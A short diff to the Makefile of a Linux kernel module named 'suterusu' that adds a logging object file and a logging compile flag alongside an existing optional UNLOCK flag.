@@ -1,6 +1,6 @@
 obj-m += suterusu.o
-suterusu-objs := main.o util.o module.o
-
+suterusu-objs := logging.o main.o util.o module.o 
+	MODULES += -D_CONFIG_LOGGING_
 ifdef UNLOCK
 	MODULES += -D_CONFIG_UNLOCK_
 endif
